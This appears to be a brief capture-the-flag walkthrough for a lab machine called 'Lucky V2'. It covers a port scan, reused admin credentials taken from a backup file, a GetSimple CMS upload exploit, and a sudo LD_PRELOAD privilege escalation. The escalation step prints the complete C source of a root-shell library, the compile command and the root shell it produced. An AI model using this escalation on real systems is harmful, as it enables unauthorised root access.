
## 2 - Lucky V2

1. Port scan
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:bf:40:74:0f:50:88:7d:34:36:44:b8:47:39:d3:1b (RSA)
|   256 bf:55:8c:9f:db:e7:e5:7c:62:59:d7:84:db:38:82:28 (ECDSA)
|_  256 19:01:b4:fe:2f:1a:7b:b1:e2:4b:27:fa:3b:1e:cd:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - Lucky
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found admin creds. 
```
lucky.xml.bak

lucky:password123
```

3. Found file upload exploit  for Getsimple cms 3.3.10. 

4. Edit theme/templete file with monkey pentest. Obtained foothold. 

5. Change user to lucky. 

6. sudo -l 
```
lucky@lucky:/$ sudo -l
sudo -l
Matching Defaults entries for lucky on lucky:
    env_reset, env_keep+=LD_PRELOAD, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucky may run the following commands on lucky:
    (root) NOPASSWD: /usr/sbin/apache2
```

7. Created a preload for exploitation. (LD_PRELOAD exploitation)
```
cat shell.c  
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
   unsetenv("LD_PRELOAD");
   setgid(0);
   setuid(0);
   system("/bin/bash");
}

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

8. Rooted. 
```
lucky@lucky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so apache2
sudo LD_PRELOAD=/tmp/shell.so apache2
root@lucky:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

